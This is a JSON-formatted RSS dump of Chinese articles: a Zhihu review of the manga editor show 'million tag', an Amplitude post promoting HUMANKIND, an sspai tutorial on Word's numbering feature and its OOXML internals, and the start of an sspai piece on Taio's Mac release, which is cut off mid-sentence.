[{"title":"如何评价集英社的编辑X漫画家节目 million tag?","date":"2021-08-10 15:30:09","description":"\n<p>暂时没什么人写，我来自问自答一下吧。</p>\n<p>我觉得漫画的绘制过程是比较枯燥和耗费精力的过程，和编辑的洽谈也并不一定会那么有趣。所以搞这么个类似爆漫王的活动，我本来是不特别看好的。而且哪有说刚看个漫画开头，还没开始连载，就决定动画化了？这绝对是最速动画化了吧。所以我对这个综艺其实是有一丝怀疑态度的。</p>\n<p>实际上，这个活动1-6期的油管视频，各话的播放数分别是：第一话：31w；第二话：14w；第三话：43w；第四话：14w；第五话：9.3w；第6话目前：14w。参考，jump油管大概目前300个视频出头，100w以上播放数的13个、50-100w的视频21个、30-50w的视频20个、20-30w的视频24个、10-20w的视频40个，所以算是，马马虎虎吧；或者说，是个“实验性质”的节目。</p>\n<p>不过这个节目还是很有意思的，比如里面提到的水之呼吸名字的由来是编辑的决定；贺来和三浦的对谈；境界触发者短篇的情节拆解；等等等等，从这方面来说，这个节目还是有一些收获的。</p>\n<p>其中1，2期的奖励和2期的辅助，分别是：藤本树的电话，远藤达哉的信件，贺来友志的对谈；而电锯人，间谍过家家，地狱乐这三部漫画，都是将要动画化的作品，所以以jump+为主体的这个节目，明显也承担了部分这三部作品的宣传工作。因此个人推测，第三轮冠军的奖励，大概是怪兽八号的作者：松本直也的解惑，你两周一更，还是有时间搞这个的吧。</p>\n<p>主持人们不说了，樱小姐真可爱。（竟然这么多期节目都没换衣服，出乎我意料，记得我看投石台里面她几乎就没穿过相同的衣服。）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-be6bfbd55a9bf225229e97ec93df716c_720w.jpg?rss\" data-rawwidth=\"350\" data-rawheight=\"410\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be6bfbd55a9bf225229e97ec93df716c\" data-watermark-src=\"v2-776d4659084535d12bfd95db37117bef\" data-private-watermark-src=\"v2-57b58c9b7b3f9b5ee1278773dee8a470\"></p>\n<p>编辑x漫画家阵容，<b>林</b>不用说了，从前面藤本树贺来友志远藤达哉就可以看出来吧，这全是林做的编辑，也是jump+最能打的作品，他明显非常注重漫画家自身的“输入工作”，所以其他人都开始画了，他们组总是：先花一周看各种书籍，漫画，电影，等等，然后再动手，非常稳健。分镜对门开合的修改，对整个剧本的改善，都一语中的，林编辑真是强。搭档的漫画家是个很有意思的人，年龄是六组中最大的，画风我也相当喜欢，有种“魔性”。每轮的故事也都挺有意思，不过第三轮的那个战斗漫画，虽然挺乐呵类似间谍过家家，但真的距离“异能力战斗”差的好远啊...估计真的不擅长这类吧。我个人也是觉得这组是最稳的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-74752883d4b27eb6e9f0aa5c96b25341_720w.jpg?rss\" data-rawwidth=\"466\" data-rawheight=\"399\" data-size=\"normal\" data-caption=\"看藤x树 这三轮里面的女性设定和分镜，似乎都有黑发女性和这样的角度\" data-watermark=\"original\" data-original-src=\"v2-74752883d4b27eb6e9f0aa5c96b25341\" data-watermark-src=\"v2-0f228584323d6d536814a8bb4fcd7775\" data-private-watermark-src=\"v2-0794f656e6071c5020c083b05769f57e\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-bef9d6e61e1c56900ee340ae971ac7f1_720w.jpg?rss\" data-rawwidth=\"521\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-bef9d6e61e1c56900ee340ae971ac7f1\" data-watermark-src=\"v2-4ff1f29a72dcd70609333452e325e4d1\" data-private-watermark-src=\"v2-4c6fc22e6704cafdb747936cc402f2a4\"></p>\n<p><b>玉田</b>个人是觉得真不行...前两轮把小姑娘心理都有点搞崩了，不知道他到底再做些什么，心理起伏太大了。第一轮那个四格，看到第一页就能猜到最后一页。我记得第一轮的标准大概是“反转，震惊感”之类的，这作品怎么拿的出来嘛。第二轮心态完全就崩了，看画面就看的出来。第三轮虽然是她擅长的战斗漫画，但个人觉得那个作品拿前三可以，拿第一还有点牵强...和第一轮一样，这位漫画家对漫画角色的情感拿捏的不太行，情感变化的有些突兀...所以我认为这<b>肯定是有剧本的成分在里面</b>...</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a7647bdac4c4f0ea06e4d64f08541257_720w.jpg?rss\" data-rawwidth=\"523\" data-rawheight=\"741\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a7647bdac4c4f0ea06e4d64f08541257\" data-watermark-src=\"v2-89e224a08559c1812ae31c40dbe488e0\" data-private-watermark-src=\"v2-d6a4b458a5af8526ec9cd5fac5a66016\"></p>\n<p>对<b>冈本</b>没什么印象...可能是这组的漫画家点子太多了所以忽视了...但是每轮这组呈现出来的作品我都很满意，和林那组并列是我最喜欢的。第三轮的魔法少女回家，虽然故事和怪兽八号有些像，有的地方的分镜我觉得有点问题，但依旧是我最喜欢的作品，第二轮的CO2也不错。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-21f8c5d7fa1941e49decd21e361cbf47_720w.jpg?rss\" data-rawwidth=\"524\" data-rawheight=\"806\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-21f8c5d7fa1941e49decd21e361cbf47\" data-watermark-src=\"v2-55b517bb2be70eb102be76a0adcef906\" data-private-watermark-src=\"v2-0e43d48d0f6cfc46b1e7e3bd82e7c1ba\"></p>\n<p><b>李光良</b>这组，是唯一一组三轮排名前三的，搭档的是“性癖猫”。我认为这个编辑还是很有实力的，比如他对异能力战斗漫画的一些坚持：必须要有必杀技；不过性癖猫真的是个非常“坚持自我”的作者，从第一回的换装play，到第二回的摸胸，第三回的体液交换，她的每部作品都非常有自己个人的风格。不过似乎这组编辑和作者是相对最针锋相对互相争论的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7636be340733cb0b143585362b33c6ed_720w.jpg?rss\" data-rawwidth=\"528\" data-rawheight=\"751\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7636be340733cb0b143585362b33c6ed\" data-watermark-src=\"v2-87a03759b1e43da8a1dfad644776f515\" data-private-watermark-src=\"v2-a66c6306b1bae336b98457b6e3863f9b\"></p>\n<p><b>双女性</b>这组，关系应该是最融洽的，可能是两个人兴趣很相近吧。第二轮编辑帮忙找自己同学进行话剧社的取材这点，可以看出还是很尽职尽责的。其他没有什么特别想说的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6eba89de4d1e4d4c43aa837d1654decc_720w.jpg?rss\" data-rawwidth=\"525\" data-rawheight=\"736\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6eba89de4d1e4d4c43aa837d1654decc\" data-watermark-src=\"v2-4ee29ad42bac045723204d7fb5b6e993\" data-private-watermark-src=\"v2-ed6263f3c63c5654b796a1dfc42f6064\"></p>\n<p><b>浅井</b>这组，虽然我对浅井还是挺有怨念的...毕竟是马修的编辑，而且还各种破事...但是他的确还是做了些事情的...第一回看了大量的四格漫画总结了经验，第三回拆解了触发的那个迅的短篇，这些我觉得做的都不错。不过第一回的故事怎么说呢，感觉恐怖漫画应该是“细思恐极”的，而不是它那种呈现...第二回的故事不太行不说了...第三回应该说，他们组的漫画反倒是最符合“异能力战斗”的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-78431b945ad61975f1f4d624005db525_720w.jpg?rss\" data-rawwidth=\"509\" data-rawheight=\"724\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-78431b945ad61975f1f4d624005db525\" data-watermark-src=\"v2-1e7232f79a59266146909e27140ce343\" data-private-watermark-src=\"v2-4ac0b261588f609a3b1f28938f8aea07\"></p>\n<p>总之，这个节目我还是觉得挺有意思的，毕竟漫勉就挺有意思的，这应该是另一种展示漫画家与编辑日常生活的方式了。节目时长一期大概也就半个小时以内吧，不过实际上他们第2，3回漫画评比我记得是绘制时间是3周，剪出半个小时，应该还是富裕的。不过我个人还是对直接动画化的决定抱怀疑态度...这真的能行吗...</p>\n<p>大概就这样，溜了溜了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tan-shu-shu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">云吞花卷</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/478580523/answer/2050928315?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/34737252?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些极端不以画工见长的漫画/漫画家？</a><br><a href=\"http://www.zhihu.com/question/455724738?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">漫画以后是否会消失，想成为漫画家，很担心？</a><br>\n","link":"http://www.zhihu.com/question/478580523/answer/2050928315?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021年8月发售的策略游戏新作《HUMANKIND》（人类）？","date":"2021-08-10 11:30:08","description":"\n<p>大家好！</p>\n<p>首先感谢知乎团队的邀请入驻。还有八天，我们的游戏《人类（《HUMANKIND™）》就要上线了，今天为大家带来一个有趣的花絮视频~</p>\n<a href=\"https://www.zhihu.com/video/1408468815714263040\">《人类（HUMANKIND）》游戏规模</a><p>游戏中共有60种不同的历史文化，你可以把它们结合起来，创造一个与你一般的独特文明。我们进行了简单的计算，推断出这60种文化可以产生超过一百万种不同的最终组合……不过实际上，我们到现在都还没算出最终的数字，我们还提供了近乎无限的虚拟形象自定义选项，可以说是无穷无尽~</p>\n<p>所以说游戏的规模很大，但我们还想用更多的数字来告诉你游戏究竟有多大。 </p>\n<p>在《Humankind》中，你可以看到129种不同的单位，他们将在10种细致精美的生态群落中穿行。这些生态群落中栖息着45种不同的动物物种，它们将在荒野中漫游，而你最终也会在其中繁衍生息。而你借此获得的成就和历史声望时刻，将通过700幅独特插图中的一幅来彰显。 </p>\n<p>随着你不断壮大你的文明，在93种科技中不断发展，你将体验到13个半小时的声响效果，内有超过1300个声音文件。与此同时，Arnaud Roy的280首气势磅礴的曲目将不断穿插其中，总共520分钟的配乐，由63名独立音乐家和20名合唱团歌唱人倾情演绎。 </p>\n<p>你自定义的虚拟形象将随着你的文明而发展，你将能够从超过122件量身定制的服装中为他们选择着装，而这些虚拟形象会通过10000多条配音台词来在游戏中表达他们的赞成或反对意见。你在150个叙述性事件中所做的选择将进一步丰富你和你的文明，而你将与竞争对手显得愈发不同——尤其是在支持10名玩家的多人游戏中！ </p>\n<p>《Humankind》已可在PC和Stadia平台上<a href=\"http://link.zhihu.com/?target=https%3A//store.humankind.game/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">进行预购</a>。游戏现在还将从8月17日起登陆Microsoft Xbox Game Pass。我们迫不及待地想让你和我们一起玩游戏，分享你的经历。</p>\n<p>- Amplitude团队</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/amplitude-studios?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">AMPLITUDE STUDIOS</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/383497512/answer/2051296175?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">8 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/52088344?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价「怒之铁拳3」这部世嘉MD游戏？</a><br><a href=\"http://www.zhihu.com/question/66949601?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待索尼官方发布疑似metal max重装机兵(误)新游戏预告？</a><br>\n","link":"http://www.zhihu.com/question/383497512/answer/2051296175?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Office 进阶技巧：Word「编号」功能详解","date":"2021-08-10 09:30:15","description":"\n<p><strong>编注：</strong>本篇文章为 Microsoft 365 工具升值包的试读内容，Microsoft 365 是少数派针对 Office 办公套件推出的「工具 + 教程」定制化产品，旨在帮助你用好手边的工具，发挥工具真正的价值。 Microsoft 365 工具升值包限时特惠即将结束，特惠价格购买再送 79 元微软定制鼠标垫，<a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">点击前往淘宝特惠下单</a>。</p>\n<hr>\n<p>编号部分由于内容非常丰富，考虑到各位的阅读体验，遂分为上、下两篇，本文为下篇。</p>\n<hr>\n<p>在从宏观角度了解 Word 中的编号如何定义和应用后，我们再将镜头拉近，观察编号段落的内部结构。</p>\n<h2>内部结构</h2>\n<p>再次回忆：编号是段落格式的一部分，也必须依附于段落而存在。</p>\n<p>本质上，编号只是段落首行开头处的一个文本范围（run），和普通段内文本一样有着字体、字号、颜色等文本格式属性，但其特殊之处在于：</p>\n<ol>\n<li>编号的内容是根据一系列规则自动计算和生成的，而不是手动输入的；</li>\n<li>编号有自己的对齐和缩进设置，因此会波及地影响其所在段落的实际缩进。</li>\n</ol>\n<p>要有一个直观的认识，只要点击任一一个编号数字，灰色底色覆盖的部分就是编号部分的范围。不过，这个看起来自成一体的编号范围，其内部实际上是由很多部分组成的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/a42cc4b8fa3505a0920fe56059d3ab9d\" alt=\"\"></figure><p>上图中的概念很多，我们结合编号设置的主阵地 ——「定义新多级列表」对话框中的选项逐一介绍。</p>\n<p>要打开「定义新多级列表」对话框，可以在任意编号上单击右键，选择「项目符号和编号」，然后单击「多级符号」选项卡下的「自定义」按钮；或者单击工具栏上的「多级列表」按钮，在下拉菜单中选择「定义新的多级列表」。</p>\n<p>可以看出，该对话框被一道分隔线分为「编号格式」和「位置」两个部分；此外，「字体」按钮还可以打开一个类似于普通字体对话框的界面。这三个部分也就分别对应了编号格式的三大类 —— 与编号数字、对齐方式和编号字体相关的设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/b1e2f6e74b8ae6875d181273056e4066\" alt=\"\"></figure><h2><strong>与编号数字相关的格式</strong></h2>\n<h3>编号格式</h3>\n<p>即以什么数字或文字显示编号。Word <a href=\"http://webapp.docx4java.org/OnlineDemo/ecma376/WordML/ST_NumberFormat.html\" target=\"_blank\">实际支持的编号格式</a> 有数十种之多，会根据语言版本的不同显示不同选项（例如中文版会提供「壹、贰、叁」等中文大写数字，日文版会提供「壱、弐、参」等日文大写数字），这里不一一列举。</p>\n<p>注意这里的下拉菜单只负责设置编号中的变量，即数字部分；数字前后的固定文本（例如「第一章、」中的「第」「章」二字和后接的顿号）需要在旁边的文本框中手动输入。</p>\n<h3>包含上级编号</h3>\n<p>很多场景下，除了需要显示当前级别的编号，还要包含上级编号。这时，可以在「包含的级别编号来自」下拉菜单中选择需要的级别，相应的上级编号会被追加到编号格式文本框中，你可以反复操作直至添加完所有所需的级别。同样地，你需要手动输入组合编号中的固定部分（例如「5.1(a)」中的句点和括号）。</p>\n<p>如果需要在某级编号中包含所有上级编号、且全部使用阿拉伯数字（形如 <code>1.2</code>，<code>2.3.3</code> 等），则可以勾选「正规形式编号」（legal style numbering，直译为法律格式编号，因在英美法律文书中常用，故名）。</p>\n<h3>起始编号和重新开始编号的间隔</h3>\n<p>这两个选项都与编号数字的「起点」相关。其中，「起始编号」很好理解，就是该级数字从序列中的第几个起算，例如如果设置为 2，则该级数字会（取决于数字格式）从 <code>2</code>、<code>B</code> 或 <code>乙</code> 开始。</p>\n<p>「重新开始编号的间隔」则指该级数字应在遇到哪一上级后重新起算。注意这里可以选择在<strong>任一上级编号</strong>后才重置，未必是<strong>紧邻</strong>的上级编号。例如，在下面的编号序列中，二级编号<code>（一）, （二）, ...</code> 和三级编号 <code>1. , 2. ， ...</code> 都被设置为在一级编号后重置，因此 <code>第一节（二）</code> 下的编号 <code>2.</code> 并未重置，直到遇到下一个一级编号 <code>第二节</code> 才重新从 <code>1.</code> 起算。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/4c60ae7b422ac915d1bf3288aad1f16e\" alt=\"\"></figure><p>不难看出，上述与编号数字相关的设置都仅仅是计数规则，而从未包含数目本身。的确，Word 从不会直接记录任何编号数字，而是根据段落套用的编号规则，现场「掰手指」算出编号的值，显示在段落开头。</p>\n<p>因此，如果你看到两个段落位置上紧邻、编号上连续，这并不表明它们是「一家人」，属于同一个编号序列（或用 OOXML 的术语来说，引用同一个编号实例）。例如，两个显示了编号 <code>10.</code> 和 <code>11.</code> 的段落完全可能分属甲乙两个不同序列，其中前一个段落是甲序列中的第十个，后一个段落是乙序列中的第一个，只是乙序列恰好设置为从 11 起算——就好像哪怕马拉多纳穿 10 号球衣，姚明穿 11 号球衣，他们也不是一个球队的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/7e5f5d7ca9446bb5e69fb3305a480dae.gif\"></figure><p>这种「关公战秦琼」的情况经常发生于在多个文档间来回复制编号的场合。与很多用户想象的不同，当编号被移植到另一个文档时，它未必会自动融入到新文档的编号序列中，而往往会保持原来的编号层级、序列和样式。只是迫于用户的强迫就范——例如手动拖拽标尺、设置字体和滥用编号项右键菜单中的「重新开始编号」（真名是「从这里分拆出一个新编号序列」）和「继续编号」（真名是「从这里缝合两个编号序列」），才显得跟上下文的编号打成一片。一旦事后再次调整编号样式，这些貌合神离的编号就会露出真实面目，显得不听使唤。</p>\n<p>要避免这种情况，在移动编号段落时，应当尽量以 Word 粘贴选项中的<strong>「纯文本」或「匹配目标格式」方式粘贴</strong>，从而去除段落先前带有的编号信息。如果要鉴别编号序列是否存在间断，可以单击要检查的编号，使其处于选中状态，只有与其属于同一序列的其他编号才会一并显示底色。</p>\n<h2><strong>与对齐方式相关的格式</strong></h2>\n<h3>编号对齐方式和对齐位置</h3>\n<p>编号有三种对齐方式，左对齐、居中对齐和右对齐，都是<strong>相对于所在段落的左侧边缘</strong>而言的，分别指编号文本的左侧边缘、中心线或右侧边缘与段落的左侧边缘对齐。而所谓的「对齐位置」就是指上述对齐基线的位置，这是一个绝对数值，从标尺的零点起算。下图中三个段落的编号对齐位置都是 0 英寸，可以看到，后两个设置了居中对齐和右对齐的编号向左突出了一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/ccf2b986902ea81657ce17e6282ad4da\" alt=\"\"></figure><p>可见，仅在编号对齐方式设置为左对齐时，对齐位置等价于于编号段落的首行起点。对于居中或右对齐的编号，对齐位置控制的是编号的中间线或右边缘位置，因此段落的视觉起点会延伸到更靠左的位置（例如本节开头图中的第四行）。</p>\n<p>（<strong>注：</strong> 顺带一提，如果你对于经常出现在缩进设置中的 0.63、1.27、1.9和 2.54 这几个默认数值感到眼熟却莫名其妙，是因为……微软是一家满脑子英寸制美国公司，这几个默认数值是从 0.25 英寸、0.5 英寸、0.75 英寸、1 英寸换算成厘米产生的。为简明起见，本文举例时暂将 Word 的单位设置改为英寸值。）</p>\n<h3>「编号之后」和制表位添加位置</h3>\n<p> 这组设置决定了编号后的实际文本从何处开始。其中，「编号之后」可在「制表符」（默认）、「空格」和「无」之间选择。比较简单的情况是设置为「无」（或「空格」）。此时，实际文本会紧随编号文本（或附加一个额外空格）后立即开始。</p>\n<p>但如果「编号之后」设置为「制表符」（tab），那么编号和实际文本之间会间隔一个制表符的长度。可那到底是多长呢？答案是……「看情况」。</p>\n<p>Word 中的制表符是一个长度可变的字符，它很像中学物理课上那辆运动在光滑平面上的小车，会一直延伸到下一个<strong>制表位</strong>（tab stop，起源于打字机上用于控制对齐的<a href=\"https://en.wikipedia.org/wiki/Tab_stop\" target=\"_blank\">同名装置</a>）为止。对于没有手动设定制表位的段落，Word 默认将标尺上每 0.5 英寸（0.63 厘米）当作一个制表位（段落的悬挂缩进位置也视为一个制表位）。</p>\n<p>因此，如果编号内容结束于 0.49 英寸处，那么随后的制表符会延伸到 0.5 英寸的位置。换言之，编号与实际文本只间隔了 0.01 英寸。但如果编号内容结束于 0.51 英寸，那么制表符会延伸到下一个默认制表位，即 1 英寸处，此时编号与实际文本间隔了 0.49 英寸。</p>\n<p>这就解释了下图上半部分所示的常见问题：10 以上编号之后的实际文本从很远的位置才开始。这是因为随着编号进入两位数，所占空间变得更大，已经来不及在前一个制表位（下图中的 0.5 英寸位置）之内结束，于是实际文本被「挤」到了下一个制表位（1 英寸位置）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/7ca8f323104825cbd94a3667950fb0fc\" alt=\"\"></figure><p>这时，「制表位添加位置」就能派上用场。它是指在编号段落的指定位置增加一个自定义的制表位，从而覆盖其左侧的全部默认制表位（悬挂缩进除外）。</p>\n<p>还是以上图为例，观察到所有编号末端都不会超过 0.6 英寸，故通过在该处添加一个制表位，就可以实现所有让各段的文本起始位置本对齐到 0.6 英寸的效果（如下半部分所示）。</p>\n<h3><strong>文本缩进位置</strong></h3>\n<p>这是一个让人一言难尽的设置。不妨做一个实验：先将该项数值填写为 0，然后不停单击右侧的上箭头，逐渐增大设置，同时观察预览框中的变化。可以发现，该设置最初只会影响第二行开始的缩进距离；可一旦增大到超过编号部分的宽度，继续上调数值就会同时影响首行实际文本的起始位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/3e042a869526d65c4744107350137f99.gif\"></figure><p>可见，「文本缩进位置」并不是一个独立的参数，它只是在间接调整着编号段落的特殊缩进：</p>\n<ul>\n<li>当<strong>文本缩进位置 &lt; 编号对齐位置</strong>时：相当于设置首行缩进，后续行文本将从编号对齐位置（也就是编号段落的左侧缩进）更左边开始；</li>\n<li>当<strong>文本缩进位置 = 编号对齐位置</strong>时：相当于关闭特殊缩进，后续行文本将从编号对齐位置开始；</li>\n<li>当<strong>文本缩进位置 &gt; 编号对齐位置</strong>时：相当于设置悬挂缩进，后续行文本将从编号对齐位置的右边开始；并且因为悬挂缩进位置被视为制表位，首行文本也将被编号后的制表符（如果有）「推」到缩进位置，于是最终结果就是首行文本和后续行文本对齐。</li>\n</ul>\n<p>细心的读者可能发现少了一种情况：但如果想让后续行文本比首行文本的缩进更大呢？答案是使用上文介绍的「制表位添加位置」选项，在文本缩进位置之前添加一个制表位，从而将首行文本「堵」在这个制表位上。</p>\n<p>下图演示了这四种不同情况：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/30973722d73ee5fc40ba8183ebd2970e\" alt=\"\"></figure><p>显然，「文本缩进设置」设计是复杂且令人困惑的，也违反了尽量避免操作副作用的程序设计原则。但木已成舟，从用户角度，我们能做的也只是提醒自己在设置时多做几个心算，同时注意观察预览图和标尺。</p>\n<h2><strong>与编号字体相关的格式</strong></h2>\n<p>这部分相对简单明了，即在编号定义对话框中点击「字体」按钮打开的设置，与普通段内文本的字体设置无异。</p>\n<p>不过，在编号定义对话框中做的字体设置会应用到所有编号项中。如果你想单独修改（或重置）某处特定编号的字体设置（例如从别处复制而来的编号段落附带了奇怪的格式），可能会发现编号部分是无法直接用鼠标选中的。如何解决呢？</p>\n<p>如之前的段落一章中所讨论，作为段落格式的一部分，编号的字体格式也是由所在段落结尾的换行标记所控制的。因此，只要打开换行标记的显示，然后对换行标记进行字体设置，就能间接地修改编号的字体，如下图。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/06/article/287128a7c2e8e276450dbd54d7b34708\" alt=\"\"></figure><p>从另一个角度说，这也提示我们要特别保护好段落标记这个编号的「命门」，在复制粘贴、使用格式刷等避免选中不必要的段落标记，导致编号格式被覆盖或丢失。</p>\n<h2><strong>编号的工作原理</strong></h2>\n<p>在了解了编号设置方式和内部结构的基础上，我们最后再深挖一下编号的工作原理。</p>\n<p>文章开头将编号功能比作「艺术」，并不纯粹是种揶揄。在批评文学艺术时，柏拉图曾说艺术是模仿的模仿、影子的影子，与真理隔了三层。柏拉图认为，现实世界是对理念世界的模仿，而艺术又是对现实世界的模仿。</p>\n<p>类似地，Word 中的编号也是从一个抽象的范式出发，经过逐层「模仿」和「套用」，最终变成为文档中显示的实际编号数字。</p>\n<p>在这个模仿链条的最上层，是 Word 文档通过内部编号部件（<code>numbering.xml</code>）存储的一系列编号定义（OOXML 标准称「抽象编号定义」，abstract numbering definitions）。定义的开头是名称、类型、链接的段落样式等基本信息，然后依次列举九级编号各自的格式。上文介绍的「定义新的多级列表」对话框中的各个选项，在编号定义中都有对应的属性。</p>\n<p>编号定义并不会被直接使用。对于文档中每一套编号，Word 都会以一个现有编号定义为模板，建立一个「实例」（OOXML 标准称「编号定义实例」，numbering definition instances）——描绘出一个「仿制品」。这个「仿制」过程并不完全是照葫芦画瓢，而是可以根据需要覆盖模版中的部分设定。</p>\n<p>使用上文介绍的各种方法创建编号时，都会导致新的编号定义和编号实例被创建出来。其中，通过自动编号和多级列表功能创建编号时，Word 文档的编号部件 <code>numbering.xml</code> 中会出现一对新的抽象编号定义以及一个引用该定义的编号实例。而用样式定义功能创建编号时，除了编号定义和编号实例，样式部件 <code>styles.xml</code> 中还会多出一个样式定义，它本身不记录任何编号格式，唯一的作用就是记录这个列表样式的名称。</p>\n<p>最后，当将一个段落设为编号段落时，Word 在该段落的属性中写下要套用的编号实例 <code>numId</code> 和所属层级 <code>ilvl</code>。这样，就可以据此逐层查阅编号部件中的实例和定义，确定要显示的编号数字和格式。</p>\n<p>以下图中的第二个段落 <code>b) [...]</code> 为例，其所在段落的属性表明该段落的编号层级为第二级、套用 id 为 42 的编号实例；Word 据此前往编号部件中检索相应的编号实例，发现它把皮球踢给了 id 为 24 的抽象编号定义；最终，在这个抽象编号定义中，Word 找到了第二级编号应当具有的格式设置，从而显示在文档中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/06/article/17034d1ff966b6eb9d37a731e73db564\" alt=\"\"></figure><h2><strong>小结</strong></h2>\n<p>本文关注 Word 中最实用、但也最容易引发用户困惑的功能之一 —— 编号，从设置方式的优劣比较出发，指出设置编号最完善、最稳定的方式是使用段落样式。接着，我们以编号定义对话框为基础，介绍了编号相关的数字格式、对齐方式和字体样式三类格式设置，并解释了各项设置在实际使用中的易错点和解决方案。最后，文章简单介绍了编号的底层工作机制 —— 从一个定义出发、经过逐层套用，最终落地为段落开头的那节数字。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67029"},{"title":"[送码] 为「桌面级」编辑场景优化，文字处理工具 Taio 推出 Mac 版","date":"2021-08-10 08:30:00","description":"\n<h2>前言</h2>\n<p>Taio 是一个 Apple 平台上的文本编辑器和处理工具，此前我们 <a href=\"https://sspai.com/post/65291\"><u>之前的文章</u></a> 中有过介绍过其在 iPhone 和 iPad 上的体验。</p>\n<p>经过最近半年的开发和测试，我们现在将 iPad 版本带到了 Mac 平台。Taio 支持「通用购买」，如果您之前在 iOS 上解锁过高级版，现在即可下载 Mac 版并完成解锁，无需再次付费。</p>\n<p>本文将简要介绍 Mac 版本的概况，并借由 Mac 版本介绍近半年增加的一些新功能。</p>\n<h2>Mac 版本概况</h2>\n<p>需要指出的是，Taio 的 Mac 版本完全使用 Apple 的 Catalyst 技术完成。早期为 iPad 做的一系列优化为我们的移植工作打下了坚实的基础，除了支持 Intel Mac 并为 Apple Silicon 做出优化外，Mac 版本也 100% 地保留了 iPad 版本的全部功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/b89883435a61ca68e40d8f96a3215da5.png\"><figcaption>Mac 版本预览</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/35e8a4d840d2f0ceadbf78ca6d353c38.png\"><figcaption>主题设置</figcaption></figure><p>由于开发精力的问题，我们一开始的计划是在初始版本砍掉一些功能，不过幸运的是碰到的困难都解决了，所以我们在一开始就得到了一个全功能的版本。例如，完全兼容基于 JSBox 编写的全部脚本，支持 macOS Big Sur 及以上的小组件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/c5c3e841a5c661828577c29ae2f80279.png\"><figcaption>运行 JSBox 脚本</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/6e9d33676177c99e31a0bba54a549732.png\"><figcaption>小组件</figcaption></figure><p>另外，我们也解决了 Catalyst 应用广为诟病的中文输入法遮挡和文字抖动的问题，这两个问题您在绝大部分的 Catalyst 应用都能看到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/d63cc050ee1babf16071256bc815b53f.png\"><figcaption>解决输入法遮挡问题</figcaption></figure><h2>Mac 版本独有的功能</h2>\n<p>虽然 Taio 